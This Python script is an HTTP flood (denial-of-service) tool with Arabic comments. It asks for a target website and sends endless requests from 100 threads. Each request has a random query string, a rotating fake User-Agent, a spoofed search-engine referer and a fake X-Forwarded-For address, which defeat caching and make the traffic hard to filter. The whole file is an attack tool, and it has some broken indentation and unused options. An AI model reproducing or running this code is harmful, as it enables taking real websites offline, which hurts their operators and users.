import urllib.request
import concurrent.futures
import random
import re
import sys
import os
from colorama import Fore
from threading import Thread, Lock
from halo import Halo
from faker import Faker
from fake_useragent import UserAgent
from logo import logo
import time

# -------------------------
# تعريف المتغيرات العالمية
lock = Lock()
fake = Faker()
ua = UserAgent()

url = ''
host = ''
request_counter = 0
flag = 0
safe = False

# معلومات الأداة
__version__ = '2.9 BETA'
__author__ = "Al-Mohammady Team"
__method__ = 'HTTP V2 BETA'

# -------------------------
# تعريف الدوال

def inc_counter():
    """زيادة عداد الطلبات بطريقة آمنة للخيوط."""
    global request_counter
    with lock:
        request_counter += 1

def set_flag(val):
    """تعيين قيمة العلم."""
    global flag
    flag = val

def set_safe():
    """تعيين الوضع الآمن."""
    global safe
    safe = True

def buildblock(size):
    out_str = ''
    for _ in range(0, size):
        a = random.randint(90, 190)
        out_str += chr(a)

    return(out_str)

def usage():
    """عرض معلومات الاستخدام."""
    spinner = Halo()
    spinner.succeed(f'Version Script: {__version__}')
    spinner.succeed(f'Method: {__method__}')
    spinner.stop()
    print('-' * 40)

def httpcall(url):
    """إرسال طلب HTTP."""
    payload = f"{buildblock(random.randint(3, 16))}={buildblock(random.randint(3, 16))}"
    request_url = f"{url}?{payload}" if '?' not in url else f"{url}&{payload}"

        headers = {
        "User-Agent": ua.random,
        "X-Requested-With": "XMLHttpRequest",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": random.choice(["https://www.google.com", "https://www.bing.com", "https://www.yahoo.com"]) + "/?q=" + buildblock(random.randint(3, 15)),
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Connection": "keep-alive",
        # "Keep-Alive": random.randint(110,120),
        # "Cookie": buildcookies(),
        # "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "X-Forwarded-For": fake.ipv4(),
    }


    try:
        req = urllib.request.Request(request_url, headers=headers)
        urllib.request.urlopen(req)
        inc_counter()
    except urllib.error.HTTPError as e:
        set_flag(1)
        print(f"{Fore.RED}( {e.code} ) {Fore.MAGENTA}Response Code!")
    except Exception:
        pass  # تجاهل الأخطاء الأخرى

def monitor_requests():
    sent = 0
    previous = 0
    spinner = Halo(text="Attacking... ", spinner="dots")
    spinner.start()
    
    while flag == 0:
        with lock:
            if request_counter >= previous + 100:
                sent += 1
                print(f"{Fore.YELLOW}( {sent} ) {Fore.GREEN}Request Sent! --> Total: {request_counter}.")
                previous = request_counter
        time.sleep(1)  # تحديث كل ثانية

    spinner.stop()
    if flag == 2:
        print(f"{Fore.RED}-- Attack Finished --{Fore.RESET}")

def attack(url):
    while flag < 2:
        try:
            httpcall(url)
        except Exception as e:
            print(f"{Fore.RED}Error in thread: {e}{Fore.RESET}")

# -------------------------
# البرنامج الرئيسي
if __name__ == "__main__":
    os.system('clear')
    logo()
    usage()

    url = input(f"{Fore.YELLOW}[ ? ]{Fore.GREEN} Website Target => ").strip()
    if url.count("/") == 2:
        url += "/"

    host = re.search(r'(https?://)?([^/]*)/?.*', url).group(2)

    safe_option = input(f"{Fore.YELLOW}[ ? ] {Fore.GREEN}Enable Safe Mode (yes/no)=> ").strip().lower()

    thread_Num = int(input(f"{Fore.YELLOW}[ ? ] {Fore.GREEN}Threads => "))
    if safe_option == "yes":
        set_safe()

    monitor_thread = Thread(target=monitor_requests, daemon=True)
    monitor_thread.start()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        try:
        	futures = [executor.submit(attack, url) for _ in range(100)]
        	concurrent.futures.wait(futures)
        except KeyboardInterrupt:
        	set_flag(2)
        	print(f"{Fore.YELLOW}( FINISH ) {Fore.RED}Attack Stopped by user.{Fore.RESET}")